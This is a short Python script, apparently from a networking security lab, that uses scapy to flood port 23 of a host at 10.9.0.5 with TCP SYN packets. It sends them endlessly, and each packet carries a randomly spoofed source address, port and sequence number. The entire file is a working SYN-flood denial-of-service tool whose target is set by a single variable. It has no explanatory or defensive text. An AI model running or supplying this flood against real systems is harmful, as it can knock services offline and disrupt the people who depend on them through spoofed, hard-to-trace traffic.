from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

DEST_IP = "10.9.0.5"

i = 1
packet = IP(dst=DEST_IP)/TCP(dport=23, flags='S')
while i:
    packet[IP].src = str(IPv4Address(getrandbits(32)))
    packet[TCP].sport = getrandbits(16)
    packet[TCP].seq = getrandbits(32)
    send(packet, iface = 'eth0', verbose = 0)
    print("Total packets sent: %d" % i)
    i+=1